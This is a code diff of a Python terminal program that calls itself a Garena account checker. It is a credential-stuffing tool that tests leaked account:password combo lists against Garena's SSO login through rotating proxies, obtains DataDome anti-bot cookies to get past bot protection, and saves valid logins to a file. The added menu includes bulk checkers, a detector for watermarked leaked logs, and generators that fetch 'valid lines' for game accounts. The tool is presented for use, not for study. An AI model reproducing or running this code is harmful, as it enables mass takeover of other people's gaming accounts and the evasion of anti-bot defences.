-                    dict(s.proxies)
-                    if hasattr(s, 'proxies') and s.proxies
-                    else None
-                )
-                dd = garner(s, proxies_arg=pdict)
-                if dd:
-                    dm.set_datadome(dd)
-                    dm.set_session_datadome(s, dd)
-            tloc.s = s
-            tloc.dm = dm
-        return (tloc.s, tloc.dm)
-
-    def _line(tag, account, password, note=''):
-        with plock:
-            if tag == 'valid':
-                console.print(
-                    f"  [bold bright_green]VALID  [/bold bright_green]  "
-                    f"[bright_white]{account}:{password}[/bright_white]"
-                )
-            else:
-                reason = (
-                    note.upper()
-                    if note
-                    else 'INCORRECT PASSWORD'
-                    if tag == 'invalid'
-                    else 'UNKNOWN ERROR'
-                )
-                color = "bold bright_red" if tag == 'invalid' else "dim"
-                console.print(
-                    f"  [{color}]INVALID[/{color}]  "
-                    f"[dim]{account}:{password}[/dim]  "
-                    f"[dim]{reason}[/dim]"
-                )
-
-    def _stats_line():
-        with stlock:
-            vv = v['valid']
-            iv = v['invalid']
-            er = v['error']
-            dn = v['done']
-        elapsed = max(time.time() - started, 0.001)
-        rate = dn / elapsed
-        eta = (total - dn) / rate if rate > 0 else 0
-        pct = dn / total * 100 if total > 0 else 0
-        bw = 20
-        filled = int(pct / 100 * bw)
-        with plock:
-            console.print()
-            console.print(Panel(
-                f"[bright_cyan]{'█' * filled}{'░' * (bw - filled)}[/bright_cyan]  "
-                f"[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  "
-                f"[dim]{dn}/{total}  ·  {rate:.1f}/s  ·  "
-                f"ETA {int(eta // 60)}m{int(eta % 60):02d}s[/dim]",
-                border_style="bright_cyan",
-                box=box.ROUNDED,
-                padding=(0, 1),
-                expand=False
-            ))
-            console.print()
-
-    def _check(pair):
-        if stopev.is_set():
-            return
-        account, password = pair
-        result = 'error'
-        note = ''
-        try:
-            session, dm = _sess()
-            v1, v2, _ = preprobe(session, account, dm)
-            if v1 == 'NO_ACCOUNT':
-                result = 'invalid'
-                note = 'Account Not Found'
-            elif v1 == 'ERROR_AUTH':
-                result = 'invalid'
-                note = str(v2) if v2 else 'error_auth'
-            elif not v1 or not v2:
-                result = 'error'
-                note = 'Prelogin Failed'
-            else:
-                sso = admit(session, account, password, v1, v2)
-                if sso and not (
-                    isinstance(sso, str)
-                    and sso.startswith('permanent_fail:')
-                ):
-                    result = 'valid'
-                    note = ''
-                else:
-                    result = 'invalid'
-                    note = 'Incorrect Password'
-        except Exception as e:
-            result = 'error'
-            note = type(e).__name__
-
-        with flock:
-            if result == 'valid':
-                good_fh.write(f'{account}:{password}\n')
-            elif result == 'invalid':
-                bad_fh.write(f'{account}:{password}\n')
-            else:
-                err_fh.write(f'{account}:{password}  | {note}\n')
-
-        with stlock:
-            v[result] += 1
-            v['done'] += 1
-            dn = v['done']
-
-        _line(result, account, password, note)
-        if dn % 5 == 0 or dn == total:
-            _stats_line()
-
-    console.print(Panel(
-        Text(f"Output: {outdir}", style="bright_cyan"),
-        border_style="bright_cyan",
-        box=box.ROUNDED,
-        expand=False
-    ))
-    print()
-
-    try:
-        with ThreadPoolExecutor(max_workers=hands) as ex:
-            futs = {ex.submit(_check, ap): ap for ap in accounts}
-            for fut in as_completed(futs):
-                if stopev.is_set():
-                    break
-                try:
-                    fut.result(timeout=30)
-                except Exception:
-                    pass
-    except KeyboardInterrupt:
-        stopev.set()
-        herald('WARNING', 'Stopping — flushing results…')
-    finally:
-        good_fh.close()
-        bad_fh.close()
-        err_fh.close()
-
-    elapsed = max(time.time() - started, 0.001)
-    with stlock:
-        vv = v['valid']
-        iv = v['invalid']
-        er = v['error']
-        dn = v['done']
-
-    def _bar(cnt, denom, color, bw=20):
-        if denom == 0:
-            return f"[dim]{'░' * bw}[/dim]"
-        f2 = int(cnt / denom * bw)
-        return (
-            f"[{color}]{'█' * f2}[/{color}]"
-            f"[dim]{'░' * (bw - f2)}[/dim]"
-        )
-
-    rtbl = Table(
-        title="[bold bright_yellow]⬡  VALIDATOR COMPLETE[/bold bright_yellow]",
-        box=box.HEAVY,
-        border_style="bright_yellow",
-        show_header=True,
-        header_style="bold dim",
-        padding=(0, 2),
-        expand=False
-    )
-    rtbl.add_column("Category", style="dim", no_wrap=True, width=14)
-    rtbl.add_column("Count", justify="right", style="bright_white", width=10)
-    rtbl.add_column("Pct", justify="right", style="bright_yellow", width=8)
-    rtbl.add_column("Bar", no_wrap=True)
-
-    for label_n, cnt, color in [
-        ('✔  Valid', vv, "bright_green"),
-        ('✖  Invalid', iv, "bright_red"),
-        ('·  Errors', er, "dim")
-    ]:
-        pct_s = f'{cnt / total * 100:.1f}%' if total else '0.0%'
-        rtbl.add_row(
-            f"[{color}]{label_n}[/{color}]",
-            f"[{color}]{cnt:,}[/{color}]",
-            pct_s,
-            _bar(cnt, total, color)
-        )
-
-    console.print(rtbl)
-    print()
-
-    statspanel = Panel(
-        Text(f"⏱  Time     {int(elapsed // 60)}m {int(elapsed % 60)}s\n", style="dim")
-        + Text(f"⚡  Rate     {dn / elapsed:.2f} acc/s\n", style="dim")
-        + Text(f"◈  Processed {dn:,}/{total:,}\n", style="dim")
-        + Text(f"✔  Valid    {good_path}\n", style="bright_cyan")
-        + Text(f"✖  Invalid  {bad_path}\n", style="bright_cyan")
-        + Text(f"·  Errors   {err_path}\n", style="bright_cyan")
-        + Text("⬡  Powered by @rriellqt", style="bold bright_magenta"),
-        border_style="bright_magenta",
-        box=box.ROUNDED,
-        expand=False
-    )
-    console.print(statspanel)
-    print()
-    input(f'  {dim}Press Enter to return to menu{rst} ')
-
-def configure():
-    global relay
-    indent = "    "
-    wipe()
-    banner()
-
-    def _head(title, sub=None):
-        if sub:
-            content = Text(title, style="bold bright_white") + Text(f"\n{sub}", style="dim")
-        else:
-            content = Text(title, style="bold bright_white")
-        console.print(Panel(content, border_style="#ff8700", box=box.ROUNDED, expand=False))
-        print()
-
-    def _panel(content, border="#ff8700"):
-        console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
-        print()
-
-    def _ok(msg):   console.print(indent + f"[bold green]  ✔ {msg}[/bold green]")
-    def _warn(msg): console.print(indent + f"[bold yellow]  ⚠ {msg}[/bold yellow]")
-    def _err(msg):  console.print(indent + f"[bold red]  ✖ {msg}[/bold red]")
-    def _info(msg): console.print(indent + f"  [bold bright_cyan]{msg}[/bold bright_cyan]")
-
-    def _ask(prompt, color="bold #ff8700"):
-        return console.input(indent + f"[{color}]  ❯ {prompt}[/{color}]").strip()
-
-    _head("PROXY CONFIGURATION", "Configure how requests are routed")
-
-    mode_text = (
-        Text("  [1]  ", style="bold #ff8700") + Text("Custom URL", style="bold white")
-        + Text("   – Single proxy, enter manually\n", style="dim")
-        + Text("  [2]  ", style="bold #ff8700") + Text("Proxy File", style="bold white")
-        + Text("   – Load multiple proxies from a file\n", style="dim")
-        + Text("  [3]  ", style="bold #ff8700") + Text("No Proxy  ", style="bold white")
-        + Text("   – Direct connection, no routing", style="dim")
-    )
-    _panel(mode_text)
-
-    while True:
-        pick = _ask("Select mode (1-3): ")
-        if pick in ("1", "2", "3"):
-            break
-        _err("Invalid choice. Enter 1, 2, or 3.")
-    print()
-
-    if pick == "1":
-        url_in = _ask("Proxy URL (Enter to skip): ").strip()
-        if not url_in:
-            relay = Relay(enabled=False)
-            _warn("No URL entered. Proxies disabled.")
-        else:
-            norm = interpret(url_in)
-            if not norm:
-                _err("Could not parse that format. Proxies disabled.")
-                relay = Relay(enabled=False)
-            else:
-                do_val = _ask("Validate proxy? (Y/n): ").lower()
-                if do_val in ("", "y", "yes"):
-                    ok_, reason_, lat_ = grade(norm)
-                    discard()
-                    if ok_:
-                        _ok(f"Proxy live.  IP: [cyan]{reason_}[/cyan]")
-                        rank(1, 1, lat_, indent)
-                        relay = Relay(enabled=True, fallback_url=norm)
-                    else:
-                        _err(f"Validation failed: [yellow]{reason_}[/yellow]")
-                        force = _ask("Use anyway? (y/N): ", color="bold yellow").lower()
-                        if force in ("y", "yes"):
-                            relay = Relay(enabled=True, fallback_url=norm)
-                            _warn("Proxy set (unvalidated).")
-                        else:
-                            relay = Relay(enabled=False)
-                            _warn("Proxies disabled.")
-                else:
-                    relay = Relay(enabled=True, fallback_url=norm)
-                    _ok("Custom proxy set (validation skipped).")
-
-    elif pick == "2":
-        file_in = _ask("File path (Enter for proxies.txt): ") or "proxies.txt"
-        print()
-        if not Path(file_in).is_file():
-            _err(f"File not found: '{file_in}'. Proxies disabled.")
-            relay = Relay(enabled=False)
-        else:
-            raw_lines = Path(file_in).read_text(encoding="utf-8", errors="ignore").splitlines()
-            parsed = []
-            for line in raw_lines:
-                url = interpret(line)
-                if url:
-                    parsed.append(url)
-            if not parsed:
-                _warn("No valid proxies found. Proxies disabled.")
-                relay = Relay(enabled=False)
-            else:
-                do_val = _ask("Validate all proxies? (Y/n): ").lower()
-                if do_val in ("", "y", "yes"):
-                    working = herd(parsed, edge=5.0, hands=500, lead=indent)
-                    discard()
-                    if not working:
-                        _err("No proxies passed validation. Proxies disabled.")
-                        relay = Relay(enabled=False)
-                    else:
-                        relay = Relay(enabled=True)
-                        relay.proxies = working
-                        _ok(f"Loaded {len(working)} validated proxies.")
-                else:
-                    relay = Relay(enabled=True)
-                    relay.proxies = parsed
-                    _ok(f"Loaded {len(parsed)} proxies (validation skipped).")
-
-    else:
-        relay = Relay(enabled=False)
-        _warn("Proxies disabled. Running direct.")
-
-    discard()
-    print()
-
-    if relay and relay.enabled and relay.proxies:
-        console.print(indent + f"[dim]Probing first proxy against sso.garena.com…[/dim]")
-        first = relay.proxies[0]
-        ok_, reason_, lat_ = reach(first, edge=20.0)
-        if ok_:
-            console.print(indent + f"[bold green]  ✔ Proxy reachable[/bold green]  [dim]({lat_:.0f}ms)[/dim]")
-        else:
-            console.print(indent + f"[bold red]  ✖ Proxy cannot reach sso.garena.com:[/bold red] [yellow]{reason_}[/yellow]")
-            force = input(indent + "  Continue anyway? (y/N): ").strip().lower()
-            if force not in ('y', 'yes'):
-                relay = Relay(enabled=False)
-                console.print(indent + f"[bold yellow]  ⚠  Proxies disabled[/bold yellow]")
-
-    print()
-    input(indent + "Press Enter to continue...")
-
-def diagnose():
-    wipe()
-    banner()
-    console.print(Panel(
-        Text("PROXY DIAGNOSTIC", style="bold bright_white")
-        + Text("\nHTTP CONNECT + TLS probe to sso.garena.com:443", style="dim"),
-        border_style="bright_magenta",
-        box=box.ROUNDED,
-        expand=False
+        Text("PROXY DIAGNOSTIC", style="bold bright_white") +
+        Text("\nHTTP CONNECT + TLS probe to sso.garena.com:443", style="dim"),
+        border_style="bright_cyan", box=box.ROUNDED, expand=False
     ))
     print()
 
     if not Path("proxies.txt").exists():
-        herald('ERROR', "proxies.txt not found.")
-        input(f'  {dim}Press Enter…{rst} ')
+        _log('ERROR', "proxies.txt not found.")
+        input(f'  {_DIM}Press Enter…{_RST} ')
         return
 
-    raw_lines = Path("proxies.txt").read_text(
-        encoding="utf-8",
-        errors="ignore"
-    ).splitlines()
+    raw_lines = Path("proxies.txt").read_text(encoding="utf-8", errors="ignore").splitlines()
     proxies = []
     for line in raw_lines:
-        p = interpret(line)
+        p = _parse_proxy_line(line)
         if p:
             proxies.append(p)
 
     if not proxies:
-        herald('ERROR', "No valid proxies found.")
-        input(f'  {dim}Press Enter…{rst} ')
+        _log('ERROR', "No valid proxies found.")
+        input(f'  {_DIM}Press Enter…{_RST} ')
         return
 
-    herald('INFO', f"Testing {len(proxies)} proxies…")
+    _log('INFO', f"Testing {len(proxies)} proxies…")
     print()
 
     results = []
-    bolt = threading.Lock()
+    lock = threading.Lock()
 
     def _run(p):
-        ok_, reason_, lat_ = reach(p, edge=20.0)
-        with bolt:
-            results.append((p, ok_, reason_, lat_))
+        ok, reason, lat = _probe_proxy_chain(p, timeout=20.0)
+        with lock:
+            results.append((p, ok, reason, lat))
 
     try:
         with ThreadPoolExecutor(max_workers=min(30, len(proxies))) as ex:
@@ -5631,189 +5049,764 @@ def diagnose():
     except KeyboardInterrupt:
         pass
 
-    good_n = sum(1 for _, o, _, _ in results if o)
-    bad_n = len(results) - good_n
+    ok_count = sum(1 for _, o, _, _ in results if o)
+    fail_count = len(results) - ok_count
 
     print()
     console.print(Panel(
-        Text(f"✔  Reachable   {good_n:,}\n", style="bold bright_green")
-        + Text(f"✖  Failed      {bad_n:,}\n", style="bold bright_red")
-        + Text(f"◈  Total       {len(results):,}\n", style="dim"),
+        Text(f"✔  Reachable   {ok_count:,}\n", style="bold bright_green") +
+        Text(f"✖  Failed      {fail_count:,}\n", style="bold bright_red") +
+        Text(f"◈  Total       {len(results):,}\n", style="dim"),
         title="[bold bright_yellow]DIAGNOSTIC COMPLETE[/bold bright_yellow]",
-        border_style="bright_yellow",
-        box=box.HEAVY,
-        expand=False
+        border_style="bright_yellow", box=box.ROUNDED, expand=False
     ))
     print()
 
     shown = 0
-    for p, ok_, reason_, lat_ in results:
+    for p, ok, reason, lat in results:
         if shown >= 10:
             break
-        tag = (
-            "[bright_green]✔[/bright_green]"
-            if ok_
-            else "[bright_red]✖[/bright_red]"
-        )
-        line = f"  {tag}  [dim]{p[:60]}[/dim]  [yellow]{reason_}[/yellow]"
-        if lat_ > 0:
-            line += f"  [cyan]{lat_:.0f}ms[/cyan]"
+        tag = "[bright_green]✔[/bright_green]" if ok else "[bright_red]✖[/bright_red]"
+        line = f"  {tag}  [dim]{p[:60]}[/dim]  [yellow]{reason}[/yellow]"
+        if lat > 0:
+            line += f"  [cyan]{lat:.0f}ms[/cyan]"
         console.print(line)
         shown += 1
     print()
 
-    if good_n == 0:
-        herald(
-            'ERROR',
-            "No proxies can reach sso.garena.com. Check your proxy service."
-        )
-        herald(
-            'INFO',
-            "Common causes: wrong auth, expired plan, wrong host/port, "
-            "or service blocks Garena."
-        )
+    if ok_count == 0:
+        _log('ERROR', "No proxies can reach sso.garena.com. Check your proxy service.")
+        _log('INFO', "Common causes: wrong auth, expired plan, wrong host/port, or service blocks Garena.")
     else:
-        herald('SUCCESS', f"{good_n} proxies look usable for Garena auth.")
+        _log('SUCCESS', f"{ok_count} proxies look usable for Garena auth.")
     print()
-    input(f'  {dim}Press Enter to return to menu{rst} ')
+    input(f'  {_DIM}↵ menu{_RST} ')
 
-def wipe():
-    os.system('cls' if os.name == 'nt' else 'clear')
 
-def banner():
-    wipe()
-    wid = measure(74)
+def display_main_menu():
+    R    = '\033[0m'
+    GOLD = '\033[96m'    # cyan     — CHECKER
+    TEAL = '\033[92m'    # green    — TOOLS
+    PINK = '\033[95m'   # purple   — GENERATORS
+    W    = '\033[1;97m'
+    DM   = '\033[2m'
 
-    rows = [
-        r" ██████╗ ██████╗ ██████╗ ███╗   ███╗",
-        r"██╔════╝██╔═══██╗██╔══██╗████╗ ████║",
-        r"██║     ██║   ██║██║  ██║██╔████╔██║",
-        r"██║     ██║   ██║██║  ██║██║╚██╔╝██║",
-        r"╚██████╗╚██████╔╝██████╔╝██║ ╚═╝ ██║",
-        r" ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝",
-    ]
+    tw = _tw()
+    w  = min(tw - 4, 76)
+    sep = f'  \033[90m{"─" * w}{R}'
 
-    tones = [
-        (150, 0, 255, 255, 120, 255),
-        (135, 0, 255, 240, 100, 255),
-        (120, 20, 255, 220, 80, 255),
-        (105, 40, 255, 200, 60, 255),
-        (90, 60, 255, 180, 40, 255),
-        (70, 90, 255, 160, 20, 255),
-    ]
+    def _sec(title, c):
+        print(f'  {c}│{R} {c}{title}{R}')
 
-    top_rule = shade('┏' + '━' * wid + '┓', 140, 0, 255, 220, 80, 255)
-    mid_rule = shade('┣' + '━' * wid + '┫', 140, 0, 255, 220, 80, 255)
-    bottom_rule = shade('┗' + '━' * wid + '┛', 140, 0, 255, 220, 80, 255)
-    left_bar = shade('┃', 140, 0, 255, 140, 0, 255)
-    right_bar = shade('┃', 220, 80, 255, 220, 80, 255)
+    def _item(n, label, desc, c):
+        print(f'    {c}▸{R} {W}{n:>2}{R}  {W}{label:<18s}{R}  {DM}{desc}{R}')
 
-    print(f"\n  {top_rule}")
-
-    for i, line in enumerate(rows):
-        r1, g1, b1, r2, g2, b2 = tones[i]
-        gl = shade(line, r1, g1, b1, r2, g2, b2)
-        vis = len(line)
-        gap = max(wid - vis, 0)
-        lp = gap // 2
-        rp = gap - lp
-        print(f"  {left_bar}{' ' * lp}{gl}{' ' * rp}{right_bar}")
-
-    print(f"  {mid_rule}")
-
-    tool = shade('rriellqt', 150, 0, 255, 255, 120, 255) + rst
-    vstr = f"{ver}v1.0{rst}"
-    author = f"{by}By{rst} {at}{brt}rriellqt{rst}"
-
-    left = f"  {tool}  {vstr}"
-    right = f"{author}  "
-
-    def vlen(s):
-        return len(re.sub(r"\033\[[0-9;]*m", "", s))
-
-    total_visible = vlen(left) + vlen(right)
-    gap = max(wid - total_visible, 1)
-    print(f"  {left_bar}{left}{' ' * gap}{right}{right_bar}")
-    print(f"  {bottom_rule}")
     print()
-
-def menu():
+    _sec('CHECKER', GOLD)
+    _item(1,  'Full Info',       'Complete account details',        GOLD)
+    _item(2,  'Semi Info',       'Level · Clean · Shell · Country',  GOLD)
+    _item(3,  'No Info',         'Fastest — Valid / Invalid only',   GOLD)
+    _item(4,  'Single Check',    'One account, full output',         GOLD)
     print()
-
-    table = Table(
-        show_header=False,
-        box=box.HORIZONTALS,
-        border_style="bright_magenta",
-        padding=(0, 2)
-    )
-    table.add_column(style="bold white")
-    table.add_column(style="white")
-    table.add_row("1", "BULK FULL INFO   - Complete account details")
-    table.add_row("2", "BULK SEMI INFO   - Valid, Level, Clean, Shell, Country")
-    table.add_row("3", "BULK NO INFO     - Fastest, Valid / Invalid only")
-    table.add_row("4", "SINGLE CHECK     - One account, full detail output")
-    panel = Panel(
-        table,
-        title="[bold white]GARENA SELECTION[/bold white]",
-        border_style="bright_magenta",
-        box=box.DOUBLE_EDGE,
-        padding=(0, 2),
-        expand=False
-    )
-    rprint(Padding(panel, (0, 0, 0, 4)))
+    _sec('TOOLS', TEAL)
+    _item(5,  'Log Separator',   'Separates logs by domain',         TEAL)
+    _item(6,  'File Splitter',   'Split lines into multiple files',  TEAL)
+    _item(7,  'File Merger',     'Merge multiple files into one',    TEAL)
+    _item(8,  'Watermark Detect','Detects if logs are leaked',       TEAL)
+    _item(9,  'Encryption',      'Encrypt your code',                TEAL)
+    print()
+    _sec('GENERATORS', PINK)
+    _item(10, 'CN31 Generator',  'Fresh cn31 for ML Checker',        PINK)
+    _item(11, 'CODM Generator',  'Valid lines for CODM',             PINK)
+    _item(12, 'MLBB Generator',  'Valid lines for MLBB',             PINK)
+    print()
+    print(sep)
+    print(f'  {GOLD}◆{R} {GOLD}@dvlist{R}')
     print()
 
     while True:
         try:
-            prompt_panel = Panel(
-                "[white]Select Mode (1-4)[/white]",
-                title="[bright_magenta]❯ Input[/bright_magenta]",
-                border_style="bright_magenta",
-                box=box.ROUNDED,
-                expand=False
-            )
-            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
-            pick = input("        ❯ ").strip()
-            if pick in ('1', '2', '3', '4'):
-                return pick
-            herald('ERROR', 'Enter 1 - 4.', '    ')
+            choice = input(f'  {TEAL}▸{R} Select [1-12]: ').strip()
+            if choice in ('1','2','3','4','5','6','7','8','9','10','11','12'):
+                return choice
+            _log('ERROR', 'Enter 1-12.', '    ')
         except KeyboardInterrupt:
             return '4'
 
-def main():
-    banner()
-    time.sleep(0.8)
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def display_banner():
+    """Render the Hesu banner — ASCII art with bright gradient + header bar."""
+    clear_screen()
+    tw = _tw()
+    R  = '\033[0m'
+    AM = '\033[1;97m'  # white
+    CY = '\033[96m'    # cyan accent
+    PK = '\033[38;5;139m'  # soft purple-gray
+    DM = '\033[2m'
+    W  = '\033[1;97m'
+
+    banner = [
+        r" ██╗  ██╗ ███████╗ ███████╗ ██╗   ██╗",
+        r" ██║  ██║ ██╔════╝ ██╔════╝ ██║   ██║",
+        r" ███████║ █████╗   ███████╗ ██║   ██║",
+        r" ██╔══██║ ██╔══╝   ╚════██║ ██║   ██║",
+        r" ██║  ██║ ███████╗ ███████║ ╚██████╔╝",
+        r" ╚═╝  ╚═╝ ╚══════╝ ╚══════╝  ╚═════╝",
+    ]
+
+    # neutral light-gray banner (not themed)
+    row_colors = [
+        (235, 237, 242,  225, 228, 235),
+        (220, 223, 230,  210, 214, 222),
+        (205, 209, 218,  198, 202, 212),
+        (192, 196, 207,  186, 190, 202),
+        (182, 186, 198,  178, 182, 195),
+        (176, 180, 193,  176, 180, 193),
+    ]
+
+    def _center(s, vis_len):
+        pad = max(tw - vis_len, 0)
+        return ' ' * (pad // 2) + s
+
+    w = min(tw - 4, 76)
+    sep = f'  \033[90m{"─" * w}{R}'
+
+    print()
+    print(sep)
+    print()
+
+    for i, line in enumerate(banner):
+        r1, g1, b1, r2, g2, b2 = row_colors[i]
+        gline = _grad_str(line, r1, g1, b1, r2, g2, b2)
+        print(_center(gline, len(line)))
+
+    print()
+
+    left  = f'  {AM}◆{R} {AM}HESU CHECKER{R} {CY}v2.0{R}  {DM}—{R}  {PK}@dvlist{R}'
+    right = f'{DM}garena account checker{R}  '
+    lv = len(re.sub(r'\033\[[0-9;]*m', '', left))
+    rv = len(re.sub(r'\033\[[0-9;]*m', '', right))
+    gap = max(tw - lv - rv, 1)
+    print(f'{left}{" " * gap}{right}')
+    print(sep)
+    print()
+
+
+
+def generate_cn31():
+    from rich.panel import Panel
+    from rich import print as rprint
+    from rich.padding import Padding
+    from rich import box
+    import requests
+    import time
+    import os
+
+    clear_screen()
+    display_banner()
+    print()
+
+    save_dir = os.path.join("Results", "CN31")
+    os.makedirs(save_dir, exist_ok=True)
+    save_file = os.path.join(save_dir, "cn31.txt")
+
+    rprint(Padding("[dim white]Press Ctrl+C to stop and return to menu.[/dim white]\n", (0, 0, 0, 4)))
+
+    try:
+        while True:
+            try:
+                response = requests.get("YOUR-API-HERE", timeout=10)
+                api_text = response.text.strip()
+            except Exception:
+                api_text = "API connection failed."
+
+            if api_text != "API connection failed.":
+                with open(save_file, "a", encoding="utf-8") as f:
+                    f.write(api_text + "\n")
+
+            rprint(Padding("[bold white]Fresh CN31 Generated[/bold white]", (0, 0, 0, 4)))
+
+            result_panel = Panel(
+                f"[bold white]{api_text}[/bold white]",
+                border_style="green",
+                box=box.DOUBLE_EDGE,
+                expand=False
+            )
+            rprint(Padding(result_panel, (0, 0, 0, 4)))
+            time.sleep(5)
+    except KeyboardInterrupt:
+        return
+
+
+def generate_codm():
+    from rich.panel import Panel
+    from rich import print as rprint
+    from rich.padding import Padding
+    from rich import box
+    import requests
+    import time
+    import os
+
+    clear_screen()
+    display_banner()
+    print()
+
+    save_dir = os.path.join("Results", "CODM_Generator")
+    os.makedirs(save_dir, exist_ok=True)
+    save_file = os.path.join(save_dir, "codm_lines.txt")
+
+    rprint(Padding("[dim white]Press Ctrl+C to stop and return to menu.[/dim white]\n", (0, 0, 0, 4)))
+
+    try:
+        while True:
+            try:
+                response = requests.get("YOUR-API-HERE", timeout=10)
+                api_text = response.text.strip()
+            except Exception:
+                api_text = "API connection failed."
+
+            if api_text != "API connection failed.":
+                with open(save_file, "a", encoding="utf-8") as f:
+                    f.write(api_text + "\n")
+
+            rprint(Padding("[bold white] FETCH LINES SUCCESFULLY [/bold white]", (0, 0, 0, 4)))
+
+            result_panel = Panel(
+                f"[bold white]{api_text}[/bold white]",
+                border_style="green",
+                box=box.DOUBLE_EDGE,
+                expand=False
+            )
+            rprint(Padding(result_panel, (0, 0, 0, 4)))
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        return
+
+
+def generate_mlbb():
+    from rich.panel import Panel
+    from rich import print as rprint
+    from rich.padding import Padding
+    from rich import box
+    import requests
+    import time
+    import os
+
+    clear_screen()
+    display_banner()
+    print()
+
+    save_dir = os.path.join("Results", "MLBB_Generator")
+    os.makedirs(save_dir, exist_ok=True)
+    save_file = os.path.join(save_dir, "mlbb_lines.txt")
+
+    rprint(Padding("[dim white]Press Ctrl+C to stop and return to menu.[/dim white]\n", (0, 0, 0, 4)))
+
+    try:
+        while True:
+            try:
+                response = requests.get("YOUR-API-HERE", timeout=10)
+                api_text = response.text.strip()
+            except Exception:
+                api_text = "API connection failed."
+
+            if api_text != "API connection failed.":
+                with open(save_file, "a", encoding="utf-8") as f:
+                    f.write(api_text + "\n")
+
+            rprint(Padding("[bold white] FETCH LINES SUCCESFULLY [/bold white]", (0, 0, 0, 4)))
+
+            result_panel = Panel(
+                f"[bold white]{api_text}[/bold white]",
+                border_style="green",
+                box=box.DOUBLE_EDGE,
+                expand=False
+            )
+            rprint(Padding(result_panel, (0, 0, 0, 4)))
+            time.sleep(1)
+    except KeyboardInterrupt:
+        return
+
+
+def file_splitter():
+    from rich.panel import Panel
+    from rich import print as rprint
+    from rich.padding import Padding
+    from rich import box
+    import math
+    import os
+
+    clear_screen()
+    display_banner()
+    print()
+
+    file_manager = AccountFileManager()
+    file_viewer = AccountFileViewer()
+    combo_files = file_manager.scan_combo_folder()
+
+    if not combo_files:
+        _log('ERROR', "No combo files found in 'Combo' folder.")
+        input(f'\n  {_DIM}↵ menu{_RST} ')
+        return
+
+    file_infos = []
+    for file_path in combo_files:
+        info = file_manager.get_file_info(file_path)
+        if info:
+            file_infos.append(info)
+
+    if not file_infos:
+        _log('ERROR', 'No valid combo files found.')
+        input(f'\n  {_DIM}↵ menu{_RST} ')
+        return
+
+    file_viewer.display_file_table(file_infos)
+    selected_file = file_viewer.prompt_file_selection(file_infos)
+
+    selected_info = next((item for item in file_infos if item["path"] == selected_file), None)
+    file_size_str = selected_info["size_str"] if selected_info else "Unknown"
 
     while True:
-        wipe()
-        banner()
-        pick = menu()
-        if pick == '1':
-            batch(style='full')
-        elif pick == '2':
-            batch(style='semi')
-        elif pick == '3':
-            batch(style='none')
-        elif pick == '4':
-            solo()
+        try:
+            prompt_panel = Panel("[white]How many lines per file?[/white]", title="[cyan]❯ Input[/cyan]", border_style="cyan", box=box.ROUNDED, expand=False)
+            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
+            lines_per_file = int(input("        ❯ ").strip())
+            if lines_per_file > 0:
+                break
+            _log('ERROR', 'Must be greater than 0.', '    ')
+        except ValueError:
+            _log('ERROR', 'Invalid input — enter a number.', '    ')
+
+    stem = Path(selected_file).stem
+    out_dir = os.path.join("Results", f"split_{stem}")
+    os.makedirs(out_dir, exist_ok=True)
+
+    try:
+        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+
+        total_lines = len(lines)
+        if total_lines == 0:
+            _log('ERROR', 'The selected file is empty.')
+            input(f'\n  {_DIM}↵ menu{_RST} ')
+            return
+
+        total_files = math.ceil(total_lines / lines_per_file)
+
+        for i in range(total_files):
+            chunk = lines[i * lines_per_file : (i + 1) * lines_per_file]
+            out_path = os.path.join(out_dir, f"{stem}_part_{i+1}.txt")
+            with open(out_path, 'w', encoding='utf-8') as out_file:
+                out_file.writelines(chunk)
+
+        from rich.table import Table
+        summary_table = Table(show_header=False, box=box.SIMPLE_HEAVY, border_style="cyan")
+        summary_table.add_column("Property", style="dim")
+        summary_table.add_column("Value", style="bold white")
+
+        summary_table.add_row("Original File Size", file_size_str)
+        summary_table.add_row("Lines per File", str(lines_per_file))
+        summary_table.add_row("Total Files Created", str(total_files))
+        summary_table.add_row("Saved Directory", out_dir)
+
+        summary_panel = Panel(
+            summary_table,
+            title="[bold green]SPLITTING COMPLETE[/bold green]",
+            subtitle="[dim cyan]Powered by: @dvlist[/dim cyan]",
+            border_style="green",
+            expand=False
+        )
+        print()
+        rprint(Padding(summary_panel, (0, 0, 0, 4)))
+
+    except Exception as e:
+        _log('ERROR', f'Failed to split file: {e}')
+
+    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')
+
+
+def file_merger():
+    from rich.panel import Panel
+    from rich import print as rprint
+    from rich.padding import Padding
+    from rich import box
+    from rich.table import Table
+    import os
+    from datetime import datetime
+
+    clear_screen()
+    display_banner()
+    print()
+
+    merge_dir = Path("merge")
+    merge_dir.mkdir(exist_ok=True)
+
+    txt_files = list(merge_dir.glob("*.txt"))
+
+    if not txt_files:
+        _log('ERROR', "No .txt files found in 'merge' folder. Please add files and try again.")
+        input(f'\n  {_DIM}↵ menu{_RST} ')
+        return
+
+    file_details = []
+    total_lines_all = 0
+
+    for fp in txt_files:
+        try:
+            size = fp.stat().st_size
+            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+                lines = f.readlines()
+                line_count = len(lines)
+                total_lines_all += line_count
+
+            size_str = f"{size} B"
+            for unit in ['B', 'KB', 'MB', 'GB']:
+                if size < 1024.0:
+                    size_str = f"{size:.2f} {unit}"
+                    break
+                size /= 1024.0
+
+            file_details.append({
+                "name": fp.name,
+                "size": size_str,
+                "lines": line_count,
+                "path": fp
+            })
+        except Exception as e:
+            _log('WARNING', f"Could not read {fp.name}: {e}")
+
+    if not file_details:
+        _log('ERROR', 'No valid files could be read.')
+        input(f'\n  {_DIM}↵ menu{_RST} ')
+        return
+
+    info_table = Table(box=box.HORIZONTALS, header_style="bold bright_cyan", border_style="bright_cyan")
+    info_table.add_column("Filename", style="bold white")
+    info_table.add_column("Size", justify="right", style="white")
+    info_table.add_column("Lines", justify="right", style="white")
+
+    for fd in file_details:
+        info_table.add_row(fd["name"], fd["size"], str(fd["lines"]))
+
+    panel = Panel(info_table, title="[bold white]FILES IN MERGE FOLDER[/bold white]", box=box.DOUBLE_EDGE, border_style="bright_cyan", expand=False)
+    rprint(Padding(panel, (0, 0, 0, 4)))
+
